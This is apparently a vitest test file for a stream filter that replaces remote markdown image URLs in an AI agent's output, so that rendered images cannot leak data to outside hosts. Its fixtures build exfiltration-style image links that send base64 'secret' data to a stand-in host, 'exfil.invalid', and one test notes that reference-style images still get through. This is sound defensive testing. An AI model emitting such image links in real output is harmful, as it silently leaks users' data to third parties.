/**
 * Neutralising remote markdown images in a model stream. The channel this
 * mitigates lives in the user's browser, so what these tests can prove is what
 * leaves the harness: the text the agent loop appends and hands to the
 * renderer, chunk by chunk.
 */

import { describe, expect, it } from 'vitest'
import type { StreamChunk } from '@deepseek-ai/dsh-llm'
import {
  BLOCKED_IMAGE_DESTINATION,
  MAX_HELD_CHARACTERS,
  heldSuffixStart,
  neutralizeImageStream,
  neutralizeRemoteImages,
} from '../../src/images.ts'

/** A host that only ever appears in these fixtures. */
const ATTACKER = 'exfil.invalid'

async function* source(chunks: readonly StreamChunk[]): AsyncIterable<StreamChunk> {
  yield* chunks
}

async function collect(stream: AsyncIterable<StreamChunk>): Promise<StreamChunk[]> {
  const seen: StreamChunk[] = []
  for await (const chunk of stream) seen.push(chunk)
  return seen
}

/** Every text a run emitted, concatenated the way the browser accumulates it. */
function streamedText(chunks: readonly StreamChunk[]): string {
  return chunks.map(chunk => chunk.type === 'text-delta' ? chunk.text : '').join('')
}

/** Split text the way the mock model and real adapters do: small fixed-size deltas. */
function deltas(text: string, size: number): StreamChunk[] {
  const chunks: StreamChunk[] = []
  for (let at = 0; at < text.length; at += size) {
    chunks.push({ type: 'text-delta', index: 0, text: text.slice(at, at + size) })
  }
  return chunks
}

describe('the inline image matcher', () => {
  it('replaces an absolute HTTP(S) destination and keeps the alt text', () => {
    const { text, hosts } = neutralizeRemoteImages(`before ![a receipt](https://${ATTACKER}/p?d=c2VjcmV0) after`)

    expect(text).toBe(`before ![a receipt](${BLOCKED_IMAGE_DESTINATION}) after`)
    expect(hosts).toEqual([ATTACKER])
  })

  it('keeps a title, and matches the angle-bracketed and http forms', () => {
    const { text, hosts } = neutralizeRemoteImages(
      `![x](<http://${ATTACKER}/a b.png> "caption") ![y](https://${ATTACKER}/y.png)`,
    )

    expect(text).toBe(
      `![x](${BLOCKED_IMAGE_DESTINATION} "caption") ![y](${BLOCKED_IMAGE_DESTINATION})`,
    )
    expect(hosts).toEqual([ATTACKER, ATTACKER])
  })

  it('leaves alone every destination the renderer would not fetch', () => {
    const text = '![a](./local.png) ![b](/abs.png) ![c](data:image/png;base64,AAAA) ![d](mailto:x@y.z) [link](https://x.test)'

    expect(neutralizeRemoteImages(text)).toEqual({ text, hosts: [] })
  })

  it('does not recognise a reference-style image, which stays a way out', () => {
    const text = `![alt][ref]\n\n[ref]: https://${ATTACKER}/r.png`

    expect(neutralizeRemoteImages(text)).toEqual({ text, hosts: [] })
  })
})

describe('holding back a partial image', () => {
  it('holds an unfinished image and a lone exclamation mark', () => {
    expect(heldSuffixStart('text ![alt](https://ex')).toBe(5)
    expect(heldSuffixStart('text !')).toBe(5)
    expect(heldSuffixStart('text ![alt](./x.png)')).toBe(20)
  })

  it('releases a suffix that has waited past the cap', () => {
    const stalled = `![${'a'.repeat(MAX_HELD_CHARACTERS)}`

    expect(heldSuffixStart(stalled)).toBe(stalled.length)
  })
})

describe('the stream wrapper', () => {
  it('neutralises a destination split across deltas, so no accumulation ever renders it', async () => {
    const hosts: string[] = []
    const text = `look: ![receipt](https://${ATTACKER}/p?d=c2VjcmV0) done`

    const emitted = await collect(neutralizeImageStream(source([
      { type: 'block-start', index: 0, blockType: 'text' },
      ...deltas(text, 8),
      { type: 'block-end', index: 0, block: { type: 'text', text } },
      { type: 'finish', reason: { kind: 'stop' } },
    ]), host => hosts.push(host)))

    // Every prefix the browser could render, checked one delta at a time.
    let rendered = ''
    for (const chunk of emitted) {
      if (chunk.type !== 'text-delta') continue
      rendered += chunk.text
      expect(rendered).not.toContain(ATTACKER)
    }
    expect(streamedText(emitted)).toBe(`look: ![receipt](${BLOCKED_IMAGE_DESTINATION}) done`)
    expect(hosts).toEqual([ATTACKER])
  })

  it('rewrites the assembled block, which is what becomes the assistant message', async () => {
    const text = `![a](https://${ATTACKER}/a.png)`

    const emitted = await collect(neutralizeImageStream(source([
      { type: 'block-end', index: 0, block: { type: 'text', text } },
    ]), () => {}))

    expect(emitted).toEqual([
      { type: 'block-end', index: 0, block: { type: 'text', text: `![a](${BLOCKED_IMAGE_DESTINATION})` } },
    ])
  })

  it('reports each host once per block, however many chunks carried it', async () => {
    const hosts: string[] = []
    const text = `![a](https://${ATTACKER}/a.png) ![b](https://${ATTACKER}/b.png)`

    await collect(neutralizeImageStream(source([
      ...deltas(text, 8),
      { type: 'block-end', index: 0, block: { type: 'text', text } },
    ]), host => hosts.push(host)))

    expect(hosts).toEqual([ATTACKER])
  })

  it('passes through every chunk it has no business rewriting', async () => {
    const chunks: StreamChunk[] = [
      { type: 'block-start', index: 1, blockType: 'reasoning' },
      { type: 'reasoning-delta', index: 1, text: `![a](https://${ATTACKER}/a.png)` },
      { type: 'block-end', index: 1, block: { type: 'reasoning', text: 'thought' } },
      { type: 'usage', usage: { inputTokens: 1, outputTokens: 1 } },
      { type: 'finish', reason: { kind: 'stop' } },
    ]

    expect(await collect(neutralizeImageStream(source(chunks), () => {}))).toEqual(chunks)
  })

  it('flushes held text before a finish and at the end of a stream that had none', async () => {
    const beforeFinish = await collect(neutralizeImageStream(source([
      { type: 'text-delta', index: 0, text: 'trailing ![' },
      { type: 'finish', reason: { kind: 'error', failure: { message: 'x', code: 'UNKNOWN' } } },
    ] as StreamChunk[]), () => {}))

    expect(streamedText(beforeFinish)).toBe('trailing ![')
    expect(beforeFinish.at(-1)?.type).toBe('finish')

    const unterminated = await collect(neutralizeImageStream(source([
      { type: 'text-delta', index: 0, text: 'trailing ![' },
    ]), () => {}))

    expect(streamedText(unterminated)).toBe('trailing ![')
  })

  it('emits a held suffix before the block closes, so nothing is lost', async () => {
    const emitted = await collect(neutralizeImageStream(source([
      { type: 'text-delta', index: 0, text: 'tail ![unfinished' },
      { type: 'block-end', index: 0, block: { type: 'text', text: 'tail ![unfinished' } },
    ]), () => {}))

    expect(emitted[0]).toEqual({ type: 'text-delta', index: 0, text: 'tail ' })
    expect(emitted[1]).toEqual({ type: 'text-delta', index: 0, text: '![unfinished' })
    expect(emitted[2]?.type).toBe('block-end')
  })
})
